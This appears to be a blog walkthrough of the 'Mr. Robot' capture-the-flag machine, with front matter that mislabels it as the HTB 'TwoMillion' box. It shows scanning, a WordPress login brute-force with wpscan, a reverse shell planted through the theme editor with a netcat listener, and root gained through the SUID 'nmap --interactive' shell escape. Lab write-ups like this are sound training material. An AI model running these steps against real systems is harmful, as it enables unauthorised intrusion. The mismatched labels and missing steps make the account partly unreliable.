---
title : "TwoMillion"
date : 2025-06-19 
layout : post
categories : [HTB]
tags : [TwoMillion]
Difficulty : Easy
author : jana
---

# 🔍 Mr. Robot CTF Walkthrough – A Penetration Testing Report

## 🧠 Objective

This report details the steps taken to compromise the *Mr. Robot* vulnerable machine. The goal is to obtain user and root flags using a combination of web enumeration, password cracking, and local privilege escalation.

---

## 🔎 1. Reconnaissance

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial.txt 10.10.10.100
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.7
```

### 🌐 Web Enumeration

Visited `http://10.10.10.100/` in browser.

- Found a **robot-themed website**.
- `robots.txt` revealed two interesting entries:
  ```
  User-agent: *
  Disallow: /fsocity.dic
  Disallow: /key-1-of-3.txt
  ```

### 🧰 Gobuster

```bash
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
```

- Found `/admin`, `/license`, `/images`, etc.
- No login forms, but `/fsocity.dic` is downloadable — appears to be a **dictionary file**.

---

## 🔓 2. Exploitation

### 🧪 Using `fsocity.dic` for WordPress Login Brute-force

Identified that the site uses **WordPress** (`wp-login.php` exists).

Used **wpscan**:

```bash
wpscan --url http://10.10.10.100 --wordlist fsocity.dic --username elliot
```

Successfully logged in as **elliot**.

### 🧬 Reverse Shell

Uploaded a **reverse shell** using WordPress theme editor (modified 404.php).

Set listener:

```bash
nc -lvnp 4444
```

Triggered reverse shell by visiting the modified file in browser.

---

## 🔐 3. Privilege Escalation

Enumerated user and found:

```bash
cat key-1-of-3.txt
```

### 🔍 Local Enumeration

Found SUID binary: `nmap`

```bash
nmap --interactive
> !sh
```

Got root shell via `nmap` interactive mode.

---

## 🏁 4. Flags

```bash
cat /home/robot/key-2-of-3.txt
```

```bash
cat /root/key-3-of-3.txt
```

---

## 📄 Summary

| Phase         | Technique / Tool                  | Result         |
|---------------|-----------------------------------|----------------|
| Recon         | Nmap, Gobuster                    | Identified WordPress |
| Exploitation  | Wpscan, fsocity.dic brute-force   | Gained user shell |
| Priv Esc      | SUID nmap                         | Root shell obtained |
| Flags         | Text files                        | ✅ All 3 flags captured |

---

## 🧠 Lessons Learned

- Always check `robots.txt` — goldmine for hidden files.
- Dictionary files can be reused for brute-force attacks.
- SUID binaries like `nmap`, `vim`, or `less` are classic privilege escalation vectors.

---

## 🧰 Tools Used

- Nmap
- Gobuster
- WPScan
- Netcat
- Burp Suite (for some traffic analysis)

---

## 📎 Tags

`#CTF` `#TryHackMe` `#VulnHub` `#WordPress` `#PrivilegeEscalation` `#Linux` `#Pentesting`

---

> ✍️ *Thanks for reading! If you found this useful, follow me for more walkthroughs and real-world pentest content.*
